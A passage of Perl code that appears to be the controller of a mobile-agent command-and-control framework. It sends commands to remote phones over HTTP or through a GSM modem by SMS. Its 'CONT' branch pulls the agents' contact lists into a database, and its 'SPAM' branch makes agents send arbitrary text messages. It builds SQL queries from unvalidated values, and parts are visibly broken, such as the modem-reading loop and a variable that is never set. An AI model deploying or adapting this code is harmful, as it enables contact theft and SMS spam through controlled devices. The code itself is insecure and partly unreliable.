					close(TEXTFILE2);

						
				}
		
			}
		}
			if ($returnmethod eq "HTTP")
                	{
                        	$command = $key . " " . "CONT" . " " . "WEB";
                        	if ($deliverymethod eq "HTTP")
                        	{
                                	$control = $webserver . $path . "/control";
                                	open(CONTROLFILE, ">$control");
					print CONTROLFILE $command;
                                	close(CONTROLFILE);
					sleep 30;
					$text = $webserver . $path . "/text.txt";
                                	open(TEXTFILE, "+<$text");
                                	$line= <TEXTFILE>;
					$table = "data";
					$sqlserver = $Variables{"MYSQLSERVER"};
                			$username = $Variables{"MYSQLUSER"};
                			$password = $Variables{"MYSQLPASS"};
                			$port = $Variables{"MYSQLPORT"};
                			$type = $Variables{"DATABASETYPE"};
					if ($type eq "postgres")
                			{
                        			$dbh = DBI->connect("DBI:Pg:dbname=framework;host=$sqlserver;port=$port",$username,$password);
					}
  					elsif ($type eq "mysql")
                			{     
			  			$dbh = DBI->connect("dbi:mysql:database=framework;host=$sqlserver;port=$port", $username,$password);
                			}
					$insertquery = "UPDATE $table SET contacts=" . "'" . $line . "'" . " WHERE id=" . "'" . $id . "'";
					$sql = $dbh->prepare($insertquery);
					$sql->execute;
					close(TEXTFILE);
					open(TEXTFILE2, ">$text");
					print TEXTFILE2 "";
					close(TEXTFILE2);
   				}
				if ($deliverymethod eq "SMS")
				{
					$modem = @split[4];
					chomp($modem);
					$sqlserver = $Variables{"MYSQLSERVER"};
                			$username = $Variables{"MYSQLUSER"};
                			$password = $Variables{"MYSQLPASS"};
               				$port = $Variables{"MYSQLPORT"};
               				 $type = $Variables{"DATABASETYPE"};
					if ($type eq "postgres")
                			{
                        			$dbh = DBI->connect("DBI:Pg:dbname=framework;host=$sqlserver;port=$port",$username,$password);
					}
  					elsif ($type eq "mysql")
                			{     
			  			$dbh = DBI->connect("dbi:mysql:database=framework;host=$sqlserver;port=$port", $username,$password);
                			}
		 			$pathquery = "SELECT path from modems where id=" . $modem; 
                               		$sql = $dbh->prepare($pathquery);
                                	$results = $sql->execute;
                                	@rows = $sql->fetchrow_array();
                                	$path2 = @rows[0];
			 		$keyquery = "SELECT controlkey from modems where id=" . $modem;
                                	$sql = $dbh->prepare($keyquery);
                                	$results2 = $sql->execute;
                                	@rows = $sql->fetchrow_array();
                                	$key2 = @rows[0];
					$numberquery = "SELECT number from agents where id=" . $id;
                                	$sql = $dbh->prepare($numberquery);
                                	$results = $sql->execute;
                                	@rows = $sql->fetchrow_array();
                                	$number2 = @rows[0];
					$typequery = "SELECT type from modems where id=" . $modem;
                                	$sql = $dbh->prepare($typequery);
                                	$results = $sql->execute;
                                	@rows = $sql->fetchrow_array();
                                	$type2 = @rows[0];
					 if ($modemtype2 eq "usb")
                                {
                                        $usb = Device::SerialPort->new("/dev/ttyUSB2");
                                        $usb->databits(8);
                                        $usb->baudrate(115200);
                                        $usb->parity("none");
                                        $usb->stopbits(1);
                                        $usb->write("ATZ\r\n");
                                        sleep(1);
                                        $line = read_modem($usb);
                                        print $line;
                                        sleep(1);
                                        $usb->write("AT+CMGF=1\r\n");
                                        $line = read_modem($usb);
                                        print $line;
                                        sleep(1);
                                          $numberline = "AT+CMGS=\"" . $number2 . "\"\r\n";
                                        $usb->write($numberline);
                                        $line = read_modem($usb);
                                        print $line;
                                        sleep(1);    
				 	  $usb->write($command.pack('c',26));
                                        sleep(10);
                                        $line = read_modem($usb);
                                        print $line;
                                        sleep(60);
                                }
                                          elsif ($modemtype2 eq "app") 
                                {
                                        

                        
						$command2 = $key2 . " " . "SEND" . " " . $number2 . " " . $command;				 		$control = $webserver . $path2 . "/getfunc";
                        			open(CONTROLFILE, ">$control");
				 		print CONTROLFILE $command2;
                        			close(CONTROLFILE);
						sleep 60;
						$text = $webserver . $path . "/text.txt";
                                		open(TEXTFILE, "+<$text");
                                		$line= <TEXTFILE>;
						$table = "data";
						$insertquery = "UPDATE $table SET contacts=" . "'" . $line . "'" . " WHERE id=" . "'" . $id . "'";
						$sql = $dbh->prepare($insertquery);
						$sql->execute;
						close(TEXTFILE);
						open(TEXTFILE2, ">$text");
						print TEXTFILE2 "";
						close(TEXTFILE2);
					}

				}
			}

		}
		elsif (@split[1] eq "SPAM")
                {                   
			$modem = @split[2];
                	$sendnumber = @split[4];
			$deliverymethod = @split[3];
			$splitlength = @split;
			$end = $splitlength - 1;
			$sendmessage = @split[5];
			if ($end > 5)
			{
				for ($i = 6; $i<=$end; $i++)
				{
					$sendmessage .= " ";
					$sendmessage .= @split[$i]; 
				} 
			}
                	$command = $key . " " . "SPAM" . " " . $sendnumber .  " " .  $sendmessage; 
                	if ($deliverymethod eq "HTTP")
                	{
                       		$control = $webserver . $path . "/control";
                        	open(CONTROLFILE, ">$control");
                        	print CONTROLFILE $command;
                        	close(CONTROLFILE);
                	}
                	if ($deliverymethod eq "SMS")
                	{
  				$username = $Variables{"MYSQLUSER"};
                                $password = $Variables{"MYSQLPASS"};
                                $port = $Variables{"MYSQLPORT"};
                                 $type = $Variables{"DATABASETYPE"};
				if ($type eq "postgres")
                		{
                        		$dbh = DBI->connect("DBI:Pg:dbname=framework;host=$sqlserver;port=$port",$username,$password);
				}
  				elsif ($type eq "mysql")
                		{     
			  		$dbh = DBI->connect("dbi:mysql:database=framework;host=$sqlserver;port=$port", $username,$password);
                		}
                                $pathquery = "SELECT path from modems where id=" . $modem;
                                $sql = $dbh->prepare($pathquery);
                                $results = $sql->execute;
                                @rows = $sql->fetchrow_array();
                                $path2 = @rows[0];
                                $typequery = "SELECT type from modems where id=" . $modem;
                                $sql = $dbh->prepare($typequery);
                                $results = $sql->execute;
                                @rows = $sql->fetchrow_array();
                                $type2 = @rows[0];
                                $keyquery = "SELECT controlkey from modems where id=" . $modem;
                                $sql = $dbh->prepare($keyquery);
                                $results2 = $sql->execute;
                                @rows = $sql->fetchrow_array();
                                $key2 = @rows[0];
				$numberquery = "SELECT number from agents where id=" . $id;
                                $sql = $dbh->prepare($numberquery);
                                $results = $sql->execute;
                                @rows = $sql->fetchrow_array();
                                $number2 = @rows[0];
                                chomp($type2);
                                if ($type2 eq "app")
                                {       
                                        $control = $webserver . $path2 . "/getfunc";
                                        $command2 = $key2 . " " . "SEND" . " " . $number2 . " " . $command;
                                        open(CONTROLFILE, ">$control");
                                        print CONTROLFILE $command2;
                                        close(CONTROLFILE);
                                }
				if ($type2 eq "usb")
				{
					 $usb = Device::SerialPort->new("/dev/ttyUSB2");
                                        $usb->databits(8);
                                        $usb->baudrate(115200);
                                        $usb->parity("none");
                                        $usb->stopbits(1);
                                        $usb->write("ATZ\r\n");
                                        sleep(1);
                                        $line = read_modem($usb);
                                        print $line;
                                        sleep(1);
                                        $usb->write("AT+CMGF=1\r\n");
                                        $line = read_modem($usb);
                                        print $line;
                                        sleep(1);
                                        $numberline = "AT+CMGS=\"" . $number2 . "\"\r\n";
                                        $usb->write($numberline);
                                        $line = read_modem($usb);
                                        print $line;
                                        sleep(1);       
                                        $usb->write($command.pack('c',26));
                                        sleep(10);
					    $line = read_modem($usb);
                                        print $line;
                                        sleep(1);
                                        $usb->close();
				}
                        }


                }       
                     
		
	}
}

sub read_modem
{
        $reader = $_[0];
        $ret="";
        $timeout = 2
        while ($timeout > 0);
        {
                 ($byte,$saw)=$reader->read(255);
                 if ($byte > 0)
                 {
                          $ret.=$saw
                 }
                 else {
                          $timeout--;
                 }
        }
        return $ret;

}

